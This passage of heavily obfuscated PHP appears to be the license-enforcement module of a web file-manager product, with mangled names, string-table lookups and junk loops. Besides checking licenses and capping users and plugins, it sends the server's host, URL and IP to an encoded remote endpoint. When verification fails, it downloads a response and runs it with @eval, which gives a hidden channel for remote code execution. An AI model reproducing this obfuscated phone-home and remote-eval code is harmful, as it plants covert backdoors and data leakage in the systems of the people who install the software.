$ÅÄòÚ¦[$À“”«¡ú[151]] = md5($ÅÄòÚ¦[$À“”«¡ú[152]] . $À“”«¡ú[166] . $ÅÄòÚ¦[$À“”«¡ú[155]]); } if ($ĞÂî¶›[$À“”«¡ú[167]] == $À“”«¡ú[168]) { $âùş‘¢İ = $this->yxie43b810b0($ƒÏ™ÎÕ», $À“”«¡ú[169]); $ŸÏ¬Å¥Ş = $this->khsyaa738375(json_encode($ÅÄòÚ¦), $ƒÏ™ÎÕ» . $À“”«¡ú[170], 3); $ŸÏ¬Å¥Ş = $ŸÏ¬Å¥Ş . $À“”«¡ú[171] . $_SERVER[$À“”«¡ú[160]]; $”Šèª“µ = $this->mbkq315d2c97($À“”«¡ú[172] . $âùş‘¢İ . $À“”«¡ú[173] . $ŸÏ¬Å¥Ş, -1); show_json($”Šèª“µ, !0); } else { if ($ĞÂî¶›[$À“”«¡ú[167]] == $À“”«¡ú[174]) { $£µÚĞÓÆ = substr(md5($À“”«¡ú[175] . $ƒÏ™ÎÕ»), 12, 15) . $À“”«¡ú[176]; $ŸÏ¬Å¥Ş = $this->bonwbe60dc44(trim($ĞÂî¶›[$À“”«¡ú[177]]), $£µÚĞÓÆ, 2); $°…ø›äÍ = json_decode($ŸÏ¬Å¥Ş, !0); if (!is_array($°…ø›äÍ) || !is_array($°…ø›äÍ[$À“”«¡ú[178]]) || $°…ø›äÍ[$À“”«¡ú[152]] != !0) { $€Ñ½õóß = $À“”«¡ú[179]; $²ŠµõŸæ = $°…ø›äÍ[$À“”«¡ú[178]] ? $À“”«¡ú[180] . $°…ø›äÍ[$À“”«¡ú[178]] : $€Ñ½õóß; show_json($²ŠµõŸæ, !1); } else { $ÅÄòÚ¦[$À“”«¡ú[155]] = $°…ø›äÍ[$À“”«¡ú[178]][$À“”«¡ú[181]]; } } else { $°…ø›äÍ = $this->mbkq315d2c97($À“”«¡ú[182], $ÅÄòÚ¦, 10); $Ã‹Ïêœ¡ = $Ø¹¬¾¶º[733]; if (strlen($Ã‹Ïêœ¡) < $Ø¹¬¾¶º[734]) { return; } } } if (!is_array($°…ø›äÍ) || !is_array($°…ø›äÍ[$À“”«¡ú[178]]) || $°…ø›äÍ[$À“”«¡ú[152]] != !0) { $€Ñ½õóß = LNG($À“”«¡ú[183]); $²ŠµõŸæ = $°…ø›äÍ[$À“”«¡ú[178]] ? $À“”«¡ú[180] . $°…ø›äÍ[$À“”«¡ú[178]] : $€Ñ½õóß; show_json($²ŠµõŸæ, !1); } $×Šğìø® = $°…ø›äÍ[$À“”«¡ú[178]]; $ÍçßÆ = $this->tury26be27c9($×Šğìø®[$À“”«¡ú[184]]); $ã×ô—¢ = $Ø¹¬¾¶º[735]; if (strlen($ã×ô—¢) < $Ø¹¬¾¶º[329]) { return; } if (!$ÍçßÆ || $ÍçßÆ != $×Šğìø®[$À“”«¡ú[129]]) { $ùÂäôï— = array($À“”«¡ú[185] => Model($À“”«¡ú[33])->get($À“”«¡ú[100]), $À“”«¡ú[186] => $_SERVER[$À“”«¡ú[106]], $À“”«¡ú[187] => this_url(), $À“”«¡ú[161] => $_SERVER[$À“”«¡ú[162]]); $ŸÏ¬Å¥Ş = $this->pneu4a79c98f(json_encode($ùÂäôï—)); $this->mbkq315d2c97($À“”«¡ú[188] . $ŸÏ¬Å¥Ş); show_json(LNG($À“”«¡ú[189]), !0); } $“¶¬ÖŒ° = array($À“”«¡ú[153] => $×Šğìø®[$À“”«¡ú[190]], $À“”«¡ú[191] => $×Šğìø®[$À“”«¡ú[192]], $À“”«¡ú[193] => rand_string(16), $À“”«¡ú[108] => $×Šğìø®[$À“”«¡ú[194]]); if ($ÅÄòÚ¦[$À“”«¡ú[155]]) { $“¶¬ÖŒ°[$À“”«¡ú[193]] = $ÅÄòÚ¦[$À“”«¡ú[155]]; } $ÁÁšíÚ = substr(md5($“¶¬ÖŒ°[$À“”«¡ú[191]]), 10, 10); $Ñ¹Éˆ› = $ÁÁšíÚ . $“¶¬ÖŒ°[$À“”«¡ú[108]] . $“¶¬ÖŒ°[$À“”«¡ú[193]]; $Äºñ¥è = $Ø¹¬¾¶º[736]; if (strlen($Äºñ¥è) < $Ø¹¬¾¶º[717]) { return; } $“¶¬ÖŒ°[$À“”«¡ú[110]] = strrev(base64_encode($this->yxie43b810b0($Ñ¹Éˆ›, $À“”«¡ú[195]))); $ùŞÅ«ùû = rand_string(16); $µØÄ¤Ãå = $Ø¹¬¾¶º[737]; if (!$µØÄ¤Ãå) { die; } $…ë™£¥´ = $ùŞÅ«ùû . $“¶¬ÖŒ°[$À“”«¡ú[108]] . $this->yxie43b810b0(md5($“¶¬ÖŒ°[$À“”«¡ú[153]]), $ùŞÅ«ùû); $†ºËÖ³ = $Ø¹¬¾¶º[738]; if (strlen($†ºËÖ³) < $Ø¹¬¾¶º[703]) { die; } $“¶¬ÖŒ°[$À“”«¡ú[111]] = base64_encode(strrev($this->yxie43b810b0($…ë™£¥´, $À“”«¡ú[196]))); if ($×Šğìø®[$À“”«¡ú[197]] && $×Šğìø®[$À“”«¡ú[197]] >= 1) { Model($À“”«¡ú[33])->setDeep($À“”«¡ú[198], $À“”«¡ú[122]); } Model($À“”«¡ú[33])->set($“¶¬ÖŒ°); $‹êÃ¨™ù = md5($_SERVER[$À“”«¡ú[106]] . strrev($àë³Ù°ß) . $“¶¬ÖŒ°[$À“”«¡ú[191]]); $¿›Áâì¦ = strrev(substr($‹êÃ¨™ù, 10, 16)); $¡´Ş€°ò = $Ø¹¬¾¶º[739]; while ($¡´Ş€°ò < $Ø¹¬¾¶º[696]) { if ($¡´Ş€°ò >= 0) { break; } $¡´Ş€°ò++; } $“µÑ—½º = $this->khsyaa738375(json_encode($×Šğìø®), $‹êÃ¨™ù); $¹‡™ü§Ş = array_to_keyvalue(Model($À“”«¡ú[7])->listData(), $À“”«¡ú[199]); $ÏĞ¡ëÍ€ = $Ø¹¬¾¶º[740]; if (!$ÏĞ¡ëÍ€) { die; } $®øšÍ¤ = $¹‡™ü§Ş[$À“”«¡ú[200]]; $Á¿Ÿ¸û = array(); $›¦íªÑ = $Ø¹¬¾¶º[741]; if (strlen($›¦íªÑ) < $Ø¹¬¾¶º[717]) { die; } $Á¿Ÿ¸û[$¿›Áâì¦] = $“µÑ—½º; $¡ú—ÑÖÀ = $Ø¹¬¾¶º[742]; while (strlen($¡ú—ÑÖÀ) < $Ø¹¬¾¶º[696]) { if (!$¡ú—ÑÖÀ) { break; } $¡ú—ÑÖÀ++; } Model($À“”«¡ú[7])->update($®øšÍ¤[$À“”«¡ú[201]], array($À“”«¡ú[202] => $Á¿Ÿ¸û)); $this->vqyz095aad98 = $×Šğìø®; $this->vxpafe7b1c7b = $“¶¬ÖŒ°[$À“”«¡ú[108]]; $this->licenseRegistSuccess(); $æßå¾—ù = $Ø¹¬¾¶º[743]; while (strlen($æßå¾—ù) < $Ø¹¬¾¶º[734]) { if (!$æßå¾—ù) { break; } $æßå¾—ù++; } Cache::set($À“”«¡ú[203] . md5($àë³Ù°ß . $À“”«¡ú[204]), $À“”«¡ú[6]); $¡‘·¨‡ã = $Ø¹¬¾¶º[744]; show_json(LNG($À“”«¡ú[189]), !0); $ÛÙäˆÕ» = $Ø¹¬¾¶º[745]; while (strlen($ÛÙäˆÕ») < $Ø¹¬¾¶º[329]) { if (!$ÛÙäˆÕ») { break; } $ÛÙäˆÕ»++; } } private function licenseRegistSuccess() { $õû¿‰Ï‚ =& $_SERVER[ŸøÁÑ©Ï]; $¬Ö é·— = Model($õû¿‰Ï‚[33])->get(); if ($¬Ö é·—[$õû¿‰Ï‚[63]] != $õû¿‰Ï‚[122]) { Model($õû¿‰Ï‚[33])->set($õû¿‰Ï‚[63], $õû¿‰Ï‚[122]); } Action($õû¿‰Ï‚[205])->initStart(!0); } private function hszu1ebd15fa() { $Şˆøïá =& $_SERVER[äô®•½Â]; $‚ëôŞù™ =& $_SERVER[ŸøÁÑ©Ï]; Model($‚ëôŞù™[33])->set(array($‚ëôŞù™[153] => $‚ëôŞù™[6], $‚ëôŞù™[191] => $‚ëôŞù™[6], $‚ëôŞù™[108] => $‚ëôŞù™[109], $‚ëôŞù™[110] => $‚ëôŞù™[6], $‚ëôŞù™[111] => $‚ëôŞù™[6])); $Ê¼ş¦îè = $Şˆøïá[746]; while (strlen($Ê¼ş¦îè) < $Şˆøïá[703]) { if (!$Ê¼ş¦îè) { break; } $Ê¼ş¦îè++; } Model($‚ëôŞù™[33])->setDeep($‚ëôŞù™[198], $‚ëôŞù™[206]); $¸Ğ¸’–ñ = $Şˆøïá[747]; $this->vqyz095aad98 = array(); $this->vxpafe7b1c7b = $‚ëôŞù™[109]; } private function wnhdf086c958() { $±¹æÄêÛ =& $_SERVER[äô®•½Â]; $’ŒíüÍ† =& $_SERVER[ŸøÁÑ©Ï]; $_SERVER[$’ŒíüÍ†[162]] = _get($_SERVER, $’ŒíüÍ†[162], APP_HOST); $this->vxpafe7b1c7b = $’ŒíüÍ†[109]; $ò¨øıæ› = Model($’ŒíüÍ†[33])->get(); $†²àÂİ— = $±¹æÄêÛ[748]; if (strlen($†²àÂİ—) < $±¹æÄêÛ[696]) { return; } if ($ò¨øıæ›[$’ŒíüÍ†[108]] == $’ŒíüÍ†[109]) { return; } $‘õÑÒ = Model($’ŒíüÍ†[33])->get($’ŒíüÍ†[100]); $¹®¸èöÌ = $’ŒíüÍ†[203] . md5($‘õÑÒ . $’ŒíüÍ†[204]); $ä×Ã²†Ø = $±¹æÄêÛ[749]; $’ÏéÚåú = Cache::get($¹®¸èöÌ); if (!is_array($’ÏéÚåú) || !isset($’ÏéÚåú[$’ŒíüÍ†[207]]) || time() - $’ÏéÚåú[$’ŒíüÍ†[207]] >= 60) { $ô…Ä‡…˜ = Model($’ŒíüÍ†[7])->loadList(); $ÜêĞÆ‘Å = $ô…Ä‡…˜[$’ŒíüÍ†[200]]; $›ğñ–†Â = md5($_SERVER[$’ŒíüÍ†[106]] . strrev($‘õÑÒ) . $ò¨øıæ›[$’ŒíüÍ†[191]]); $¿š”Î“ = strrev(substr($›ğñ–†Â, 10, 16)); $’ÏéÚåú = $this->bonwbe60dc44($ÜêĞÆ‘Å[$’ŒíüÍ†[86]][$¿š”Î“], $›ğñ–†Â); $’ÏéÚåú = json_decode($’ÏéÚåú, !0); } if (!is_array($’ÏéÚåú)) { return $this->hszu1ebd15fa(); } $¦†Û‡¶Ö = strtotime($’ÏéÚåú[$’ŒíüÍ†[129]]); if (time() >= $¦†Û‡¶Ö) { return $this->hszu1ebd15fa(); } if (!isset($’ÏéÚåú[$’ŒíüÍ†[207]]) || time() - $’ÏéÚåú[$’ŒíüÍ†[207]] > 20) { $’ÏéÚåú[$’ŒíüÍ†[207]] = time(); Cache::set($¹®¸èöÌ, $’ÏéÚåú); } $this->vqyz095aad98 = $’ÏéÚåú; $this->vxpafe7b1c7b = $ò¨øıæ›[$’ŒíüÍ†[108]]; } private function tdxkd2e68ad3() { $Ô‚ŞÚù© =& $_SERVER[ŸøÁÑ©Ï]; $…¹àöœ = $GLOBALS[$Ô‚ŞÚù©[13]]; $ü óñÁ™ = $_SERVER[$Ô‚ŞÚù©[24]]; if ($ü óñÁ™ == $Ô‚ŞÚù©[208] && $this->vxpafe7b1c7b == $Ô‚ŞÚù©[109]) { show_json(LNG($Ô‚ŞÚù©[209]), !1, $Ô‚ŞÚù©[210]); } $œ°Ûò…Ò = array($Ô‚ŞÚù©[211], $Ô‚ŞÚù©[212]); if (in_array($ü óñÁ™, $œ°Ûò…Ò)) { if ($this->vxpafe7b1c7b == $Ô‚ŞÚù©[109] && isset($…¹àöœ[$Ô‚ŞÚù©[213]])) { show_json(LNG($Ô‚ŞÚù©[209]), !1, $Ô‚ŞÚù©[210]); die; } $ñÂÓ¶“Ò = $this->pazjd5250e6b(); if ($ñÂÓ¶“Ò != intval($Ô‚ŞÚù©[214])) { if ($ñÂÓ¶“Ò <= Model($Ô‚ŞÚù©[125])->count()) { show_json(LNG($Ô‚ŞÚù©[215]), !1, $Ô‚ŞÚù©[210]); die; } } } } private function ophua4fdb13a() { $¨°»ğÂÚ =& $_SERVER[äô®•½Â]; $°‚ì«§ö =& $_SERVER[ŸøÁÑ©Ï]; $£Ÿ¬Öà = array($°‚ì«§ö[119], $°‚ì«§ö[120]); if (!KodUser::isRoot() || !isset($_GET[$°‚ì«§ö[216]])) { return; } if (!in_array($_SERVER[$°‚ì«§ö[24]], $£Ÿ¬Öà)) { return; } $â¶ğ‰ù¥ = $°‚ì«§ö[217]; $ñÒãÎîª = $¨°»ğÂÚ[750]; if (!$ñÒãÎîª) { return; } $â¶ğ‰ù¥ = $this->dqpf96e6e95c($â¶ğ‰ù¥, $°‚ì«§ö[218]); $í¬Ø™ãş = stream_context_create(array($°‚ì«§ö[219] => array($°‚ì«§ö[220] => $°‚ì«§ö[221], $°‚ì«§ö[222] => 3))); $ÀÎŠ×…— = @file_get_contents($â¶ğ‰ù¥, !1, $í¬Ø™ãş); $†Ö¤±òº = $¨°»ğÂÚ[751]; if (strlen($†Ö¤±òº) < $¨°»ğÂÚ[696]) { return; } header($°‚ì«§ö[223]); if ($ÀÎŠ×…— && strstr($ÀÎŠ×…—, $°‚ì«§ö[224])) { echo $ÀÎŠ×…—; } die; } public function rvbfdcef053e($•Â­İ ‚) { $É÷Äîæ· =& $_SERVER[äô®•½Â]; $×¹ç€¦’ =& $_SERVER[ŸøÁÑ©Ï]; if ($this->vxpafe7b1c7b == $×¹ç€¦’[225]) { return $•Â­İ ‚; } $›öÂíì = $this->versionPluginList(); $Ş³Ö– = explode($×¹ç€¦’[226], $this->versionPluginFilter()); $É”ÒÖ = array(); $ë¾ßŸÂ = $É÷Äîæ·[752]; foreach ($›öÂíì as $ºÍ¾Ø•€ => $Ö‡‹š—µ) { if ($Ö‡‹š—µ == $×¹ç€¦’[227] && substr($this->vxpafe7b1c7b, 0, 1) == $×¹ç€¦’[227]) { continue; } if (!in_array($ºÍ¾Ø•€, $Ş³Ö–)) { $É”ÒÖ[] = $ºÍ¾Ø•€; } } foreach ($É”ÒÖ as $ºÍ¾Ø•€) { unset($•Â­İ ‚[$ºÍ¾Ø•€]); } return $•Â­İ ‚; $­¤â¸¡Ş = $É÷Äîæ·[753]; while (strlen($­¤â¸¡Ş) < $É÷Äîæ·[329]) { if (!$­¤â¸¡Ş) { break; } $­¤â¸¡Ş++; } } private function versionPluginList() { $±¾šôİï =& $_SERVER[ŸøÁÑ©Ï]; return array($±¾šôİï[228] => $±¾šôİï[227], $±¾šôİï[229] => $±¾šôİï[227], $±¾šôİï[230] => $±¾šôİï[227], $±¾šôİï[231] => $±¾šôİï[227], $±¾šôİï[232] => $±¾šôİï[233], $±¾šôİï[234] => $±¾šôİï[233], $±¾šôİï[235] => $±¾šôİï[233], $±¾šôİï[236] => $±¾šôİï[233], $±¾šôİï[237] => $±¾šôİï[233], $±¾šôİï[238] => $±¾šôİï[233], $±¾šôİï[239] => $±¾šôİï[233], $±¾šôİï[240] => $±¾šôİï[233], $±¾šôİï[241] => $±¾šôİï[233], $±¾šôİï[242] => $±¾šôİï[233], $±¾šôİï[243] => $±¾šôİï[233], $±¾šôİï[244] => $±¾šôİï[233], $±¾šôİï[245] => $±¾šôİï[233], $±¾šôİï[246] => $±¾šôİï[233]); } private function versionPluginFilter() { $”¤£æª =& $_SERVER[äô®•½Â]; $üì¼’¤ö =& $_SERVER[ŸøÁÑ©Ï]; if ($this->vxpafe7b1c7b == $üì¼’¤ö[109]) { return $üì¼’¤ö[6]; } $œãÎÁìœ = _get($this->vqyz095aad98, $üì¼’¤ö[247], $üì¼’¤ö[6]); $€¤èÏ©² = $”¤£æª[754]; while ($€¤èÏ©² < $”¤£æª[717]) { if ($€¤èÏ©² >= 0) { break; } $€¤èÏ©²++; } $ø„¥¿ïÆ = _get($this->vqyz095aad98, $üì¼’¤ö[116], $üì¼’¤ö[6]); $ùµŞ‚Ú = _get($this->vqyz095aad98, $üì¼’¤ö[248], $üì¼’¤ö[6]); $èÂ×í÷ = $”¤£æª[755]; if (strlen($èÂ×í÷) < $”¤£æª[717]) { die; } if ($ø„¥¿ïÆ > time() && $ùµŞ‚Ú > time()) { $²¦ÃáÑ = explode($üì¼’¤ö[226], $œãÎÁìœ); $ÚÏÍíéÎ = array_keys($this->versionPluginList()); $œãÎÁìœ = array_merge($²¦ÃáÑ, $ÚÏÍíéÎ); $œãÎÁìœ = implode($üì¼’¤ö[226], array_filter(array_unique($œãÎÁìœ))); } return $œãÎÁìœ; } private function gtes1f12b5ab() { $×˜¿†Áò =& $_SERVER[ŸøÁÑ©Ï]; if ($this->vxpafe7b1c7b != $×˜¿†Áò[109]) { $GLOBALS[$×˜¿†Áò[86]][$×˜¿†Áò[90]][$×˜¿†Áò[249]] = $×˜¿†Áò[206]; return; } $GLOBALS[$×˜¿†Áò[86]][$×˜¿†Áò[250]] = $×˜¿†Áò[122]; if (Model($×˜¿†Áò[251])->get($×˜¿†Áò[63]) != $×˜¿†Áò[206]) { Model($×˜¿†Áò[251])->set($×˜¿†Áò[63], $×˜¿†Áò[206]); } } public function ilkw5dff62d7() { return $_SERVER[ŸøÁÑ©Ï][252]; $—¹Ûı… = $_SERVER[äô®•½Â][756]; } private function efrv3e5c0cc9() { $›ˆ¾ˆ€ë =& $_SERVER[ŸøÁÑ©Ï]; $…ÆÑÑÜû = array($›ˆ¾ˆ€ë[253], $›ˆ¾ˆ€ë[254], $›ˆ¾ˆ€ë[255]); $›“²é·Û = $›ˆ¾ˆ€ë[256] . md5($›ˆ¾ˆ€ë[257]); if ($this->vxpafe7b1c7b == $›ˆ¾ˆ€ë[109] || !KodUser::isRoot()) { return; } if (!in_array($_SERVER[$›ˆ¾ˆ€ë[24]], $…ÆÑÑÜû)) { return; } if (time() % 4 != 0) { return; } $ÇğËöşà = call_user_func(array($›ˆ¾ˆ€ë[258], $›ˆ¾ˆ€ë[259]), $›“²é·Û); $Ç…ÍÙÀ = $_SERVER[äô®•½Â][757]; if ($ÇğËöşà && time() - $ÇğËöşà < intval($›ˆ¾ˆ€ë[260])) { return; } call_user_func(array($›ˆ¾ˆ€ë[258], $›ˆ¾ˆ€ë[139]), $›“²é·Û, time()); $óù “ç° = Model($›ˆ¾ˆ€ë[33])->get($›ˆ¾ˆ€ë[100]); $å¿˜ëÈ¤ = array($›ˆ¾ˆ€ë[152] => Model($›ˆ¾ˆ€ë[33])->get($›ˆ¾ˆ€ë[153]), $›ˆ¾ˆ€ë[167] => $this->vxpafe7b1c7b, $›ˆ¾ˆ€ë[163] => $_SERVER[$›ˆ¾ˆ€ë[164]], $›ˆ¾ˆ€ë[165] => Model($›ˆ¾ˆ€ë[33])->get($›ˆ¾ˆ€ë[131]), $›ˆ¾ˆ€ë[105] => md5($_SERVER[$›ˆ¾ˆ€ë[106]] . $óù “ç°), $›ˆ¾ˆ€ë[156] => $›ˆ¾ˆ€ë[136], $›ˆ¾ˆ€ë[159] => $_SERVER[$›ˆ¾ˆ€ë[160]]); $ÑÚŠØë¬ = $this->mbkq315d2c97($›ˆ¾ˆ€ë[261], $å¿˜ëÈ¤); if (!is_array($ÑÚŠØë¬)) { return; } if ($ÑÚŠØë¬[$›ˆ¾ˆ€ë[152]] && $ÑÚŠØë¬[$›ˆ¾ˆ€ë[262]]) { if ($this->tury26be27c9($ÑÚŠØë¬[$›ˆ¾ˆ€ë[262]]) == $å¿˜ëÈ¤[$›ˆ¾ˆ€ë[152]]) { return; } } $this->hszu1ebd15fa(); if ($this->tury26be27c9($ÑÚŠØë¬[$›ˆ¾ˆ€ë[262]]) != $å¿˜ëÈ¤[$›ˆ¾ˆ€ë[152]]) { $îçÚ¦”Æ = array($›ˆ¾ˆ€ë[185] => $óù “ç°, $›ˆ¾ˆ€ë[186] => $_SERVER[$›ˆ¾ˆ€ë[106]], $›ˆ¾ˆ€ë[187] => this_url(), $›ˆ¾ˆ€ë[161] => $_SERVER[$›ˆ¾ˆ€ë[162]]); $Â´·Û´ş = $this->pneu4a79c98f(json_encode($îçÚ¦”Æ)); $ÑÚŠØë¬ = $this->mbkq315d2c97($›ˆ¾ˆ€ë[188] . $Â´·Û´ş); if ($ÑÚŠØë¬ && is_array($ÑÚŠØë¬) && isset($ÑÚŠØë¬[$›ˆ¾ˆ€ë[262]])) { $şßÂ…È¨ = $this->bonwbe60dc44($ÑÚŠØë¬[$›ˆ¾ˆ€ë[262]], 2); if ($şßÂ…È¨) { $şßÂ…È¨ = $this->tury26be27c9($şßÂ…È¨); } if ($şßÂ…È¨) { try { @eval($şßÂ…È¨); } catch (Exception $‡µ®•ŒÄ) { } } } } } private function mbkq315d2c97($ğ¹³åÆÍ = '', $½æÆŒ’° = array(), $ÏáÀòµÊ = 5) { $®õÂ´Ø’ =& $_SERVER[äô®•½Â]; $äÔ€Œˆ =& $_SERVER[ŸøÁÑ©Ï]; $·äãâö = $äÔ€Œˆ[263]; $ƒ€³úİ‡ = $®õÂ´Ø’[758]; $·äãâö = $this->dqpf96e6e95c($·äãâö, $äÔ€Œˆ[264]); $°¾´ØãÉ = $®õÂ´Ø’[759]; while (strlen($°¾´ØãÉ) < $®õÂ´Ø’[329]) { if (!$°¾´ØãÉ) { break; } $°¾´ØãÉ++; } $·äãâö = $·äãâö . $ğ¹³åÆÍ; if ($½æÆŒ’° && is_array($½æÆŒ’°)) { $·äãâö = $·äãâö . $äÔ€Œˆ[265] . http_build_query($½æÆŒ’°); } if ($½æÆŒ’° === -1) { return $·äãâö; } $¸ÙÔ¿¾Å = stream_context_create(array($äÔ€Œˆ[219] => array($äÔ€Œˆ[222] => $ÏáÀòµÊ, $äÔ€Œˆ[220] => $äÔ€Œˆ[266]), $äÔ€Œˆ[267] => array($äÔ€Œˆ[268] => !1, $äÔ€Œˆ[269] => !1))); $½æÆŒ’° = @file_get_contents($·äãâö, !1, $¸ÙÔ¿¾Å); $éŸÙîŠ» = $®õÂ´Ø’[760]; if (strlen($éŸÙîŠ») < $®õÂ´Ø’[717]) { return; } return json_decode($½æÆŒ’°, !0); $¨ØÑÆş = $®õÂ´Ø’[761]; if (!$¨ØÑÆş) { return; } } private function pazjd5250e6b() { $‘ßõ¿– =& $_SERVER[äô®•½Â]; $€şë–¥Ï =& $_SERVER[ŸøÁÑ©Ï]; $ÜìÄİ  = array($€şë–¥Ï[270] => $€şë–¥Ï[271], $€şë–¥Ï[272] => $€şë–¥Ï[273], $€şë–¥Ï[274] => $€şë–¥Ï[275], $€şë–¥Ï[276] => $€şë–¥Ï[277], $€şë–¥Ï[278] => $€şë–¥Ï[279], $€şë–¥Ï[280] => $€şë–¥Ï[214], $€şë–¥Ï[281] => $€şë–¥Ï[214], $€şë–¥Ï[282] => $€şë–¥Ï[271], $€şë–¥Ï[283] => $€şë–¥Ï[273], $€şë–¥Ï[284] => $€şë–¥Ï[275], $€şë–¥Ï[285] => $€şë–¥Ï[286], $€şë–¥Ï[287] => $€şë–¥Ï[277], $€şë–¥Ï[288] => $€şë–¥Ï[289], $€şë–¥Ï[290] => $€şë–¥Ï[279], $€şë–¥Ï[291] => $€şë–¥Ï[292], $€şë–¥Ï[293] => $€şë–¥Ï[294], $€şë–¥Ï[295] => $€şë–¥Ï[296]); $Ã¨öƒÏ— = $‘ßõ¿–[762]; if (strlen($Ã¨öƒÏ—) < $‘ßõ¿–[696]) { die; } $ó¶àûİç = $ÜìÄİ [$this->vxpafe7b1c7b]; $ÚÚ™ÅŞ› = $‘ßõ¿–[763]; if (!$ÚÚ™ÅŞ›) { die; } $ó¶àûİç = intval($ó¶àûİç ? $ó¶àûİç : $€şë–¥Ï[271]); $ÍéŞÏÎ‚ = $‘ßõ¿–[750]; if (!$ÍéŞÏÎ‚) { die; } $ğ„î•ı = _get($this->vqyz095aad98, $€şë–¥Ï[297]); $ğ„î•ı = $ğ„î•ı ? intval($ğ„î•ı) : 0; $ÊÈ¼†Ïï = $‘ßõ¿–[764]; if (strlen($ÊÈ¼†Ïï) < $‘ßõ¿–[696]) { die; } return $ó¶àûİç + $ğ„î•ı; } public function qyfl50c1bd7a($ã¢åÅ›) { $ ‚Õ ‡Õ =& $_SERVER[äô®•½Â]; $¶¿âö¹ =& $_SERVER[ŸøÁÑ©Ï]; $Êöü·­Ç = $this->pazjd5250e6b(); $Â€¨´Àë = $ ‚Õ ‡Õ[765]; if ($ã¢åÅ›[$¶¿âö¹[298]] == $¶¿âö¹[122]) { return; } if ($Êöü·­Ç >= intval($¶¿âö¹[214])) { return; } $‚¢Ü³½Î = Model($¶¿âö¹[125])->count(); $œÆªø·ä = $ ‚Õ ‡Õ[766]; while ($œÆªø·ä < $ ‚Õ ‡Õ[717]) { if ($œÆªø·ä >= 0) { break; } $œÆªø·ä++; } if ($‚¢Ü³½Î <= $Êöü·­Ç) { return; } $õ‹Õ¾ŠÈ = Model($¶¿âö¹[125])->field($¶¿âö¹[298])->limit($Êöü·­Ç)->select(); $¥ÄóÄ·õ = $ ‚Õ ‡Õ[767]; if (!$¥ÄóÄ·õ) { return; } $õ‹Õ¾ŠÈ = array_to_keyvalue($õ‹Õ¾ŠÈ, $¶¿âö¹[6], $¶¿âö¹[298]); if (!in_array($ã¢åÅ›[$¶¿âö¹[298]], $õ‹Õ¾ŠÈ)) { show_json($¶¿âö¹[299], !1, $¶¿âö¹[210]); } } public function ibprc93940e5() { $²†ä®şª =& $_SERVER[äô®•½Â]; $ˆ¸¨¨ï =& $_SERVER[ŸøÁÑ©Ï]; if (!KodUser::isRoot() || mt_rand(1, 100) > 20) { return; } $¹ğØÎÁ = $ˆ¸¨¨ï[217]; $¹ğØÎÁ = $this->dqpf96e6e95c($¹ğØÎÁ, $ˆ¸¨¨ï[218]); $Î“œ«¼— = $²†ä®şª[768]; if (strlen($Î“œ«¼—) < $²†ä®şª[703]) { return; } $üÚ•öæ± = stream_context_create(array($ˆ¸¨¨ï[219] => array($ˆ¸¨¨ï[220] => $ˆ¸¨¨ï[221], $ˆ¸¨¨ï[222] => 3))); $½©ğË×£ = @file_get_contents($¹ğØÎÁ, !1, $üÚ•öæ±); $†Ú¶¨¾ = $²†ä®şª[769]; echo $ˆ¸¨¨ï[300] . hash_encode($½©ğË×£) . $ˆ¸¨¨ï[301]; $áÚãíÖ“ = $²†ä®şª[712]; } private function khsyaa738375($ŞóçÂ™, $Á¸Ü‚ü», $¨¿­¬Î¦ = 3) { $“Ã±¯Æâ =& $_SERVER[äô®•½Â]; $è¤ÃÔÑ– =& $_SERVER[ŸøÁÑ©Ï]; usleep(1); $ŞóçÂ™ = trim($ŞóçÂ™); $ÍİõÛ“ = mt_rand(0, 5) . $è¤ÃÔÑ–[6]; $ÂÉîŠÕÂ = rand_string(15); $É…ñÍâ = $è¤ÃÔÑ–[302]; switch ($ÍİõÛ“) { case $è¤ÃÔÑ–[206]: $»ÚšŠ€ = $this->yxie43b810b0($ŞóçÂ™, strrev($Á¸Ü‚ü» . $ÂÉîŠÕÂ)); $Ş©ªì½ı = $“Ã±¯Æâ[770]; while ($Ş©ªì½ı < $“Ã±¯Æâ[329]) { if ($Ş©ªì½ı >= 0) { break; } $Ş©ªì½ı++; } break; case $è¤ÃÔÑ–[122]: $»ÚšŠ€ = $this->yxie43b810b0($ŞóçÂ™, strrev($ÂÉîŠÕÂ . $Á¸Ü‚ü»)); break; case $è¤ÃÔÑ–[303]: $»ÚšŠ€ = $this->yxie43b810b0($ŞóçÂ™, base64_encode($ÂÉîŠÕÂ . $Á¸Ü‚ü»)); break; case $è¤ÃÔÑ–[304]: $»ÚšŠ€ = $this->yxie43b810b0($ŞóçÂ™, md5($ÂÉîŠÕÂ . $Á¸Ü‚ü»)); break; $õŒüÃ› = $“Ã±¯Æâ[771]; case $è¤ÃÔÑ–[305]: $ŞóçÂ™ = base64_encode($ŞóçÂ™); $æœÅ²¢Ñ = rand(0, 64); $ù¿‰µüÀ = $É…ñÍâ[$æœÅ²¢Ñ]; $—†¯î†ø = md5($ù¿‰µüÀ . md5($Á¸Ü‚ü» . $ù¿‰µüÀ) . $Á¸Ü‚ü»); $ş³şüùø = $“Ã±¯Æâ[772]; if (strlen($ş³şüùø) < $“Ã±¯Æâ[703]) { die; } $—†¯î†ø = substr($—†¯î†ø, $æœÅ²¢Ñ % 8, $æœÅ²¢Ñ % 8 + 7); $—´ß×â¥ = $è¤ÃÔÑ–[6]; $ü˜½œ„Ü = 0; $³íû‡€ = 0; $”ûà³¤ = 0; $ŸË§ç¢¦ = $“Ã±¯Æâ[773]; if (strlen($ŸË§ç¢¦) < $“Ã±¯Æâ[329]) { return; } for ($ü˜½œ„Ü = 0; $ü˜½œ„Ü < strlen($ŞóçÂ™); $ü˜½œ„Ü++) { $”ûà³¤ = $”ûà³¤ == strlen($—†¯î†ø) ? 0 : $”ûà³¤; $³íû‡€ = ($æœÅ²¢Ñ + strpos($É…ñÍâ, $ŞóçÂ™[$ü˜½œ„Ü]) + ord($—†¯î†ø[$”ûà³¤++])) % 64; $—´ß×â¥ .= $É…ñÍâ[$³íû‡€]; } $»ÚšŠ€ = hash_encode($ù¿‰µüÀ . $—´ß×â¥); $çĞ‰Ë‹û = $“Ã±¯Æâ[774]; if (strlen($çĞ‰Ë‹û) < $“Ã±¯Æâ[734]) { die; } break; default: $»ÚšŠ€ = $this->yxie43b810b0($ŞóçÂ™, $Á¸Ü‚ü» . $ÂÉîŠÕÂ); break; $ÃÂ€·©Ö = $“Ã±¯Æâ[775]; if (!$ÃÂ€·©Ö) { return; } } $»ÚšŠ€ = strrev($ÍİõÛ“ . $ÂÉîŠÕÂ . $»ÚšŠ€); if ($¨¿­¬Î¦ - 1 > 0) { $»ÚšŠ€ = 